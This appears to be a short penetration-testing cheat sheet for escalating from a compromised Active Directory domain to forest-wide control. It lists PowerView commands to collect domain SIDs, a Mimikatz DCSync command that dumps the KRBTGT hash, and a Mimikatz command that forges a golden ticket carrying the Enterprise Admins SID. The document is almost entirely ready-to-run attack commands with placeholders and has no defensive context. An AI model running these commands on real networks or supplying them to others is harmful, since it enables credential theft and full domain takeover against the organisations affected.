### Get SID of compromised domain using Bloodhound or Powerview
```
Get-DomainSID
```

### Get SID of target domain using Bloodhound or Powerview
```
Get-NetForest
```

### Get KRBTGT NTLM hash
```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:&lt;compromisedDomain&gt; /user:krbtgt"'
```

### Request golden ticket - can be done offline, since domain controller connection is not necessary (/enind = validity period 60 minutes, /user can be fictitious, -519 is the SID of enteprise admin)
```
Invoke-Mimikatz -Command '"kerberos::golden /user:&lt;attackerAccount&gt; /domain:&lt;compromisedDomain&gt; /sid:&lt;sidCompromisedDomain&gt; /sids:&lt;sidTargetDomain&gt;-519 /krbtgt:&lt;ntlmHashKrbTgt&gt; /endin:60"'
```


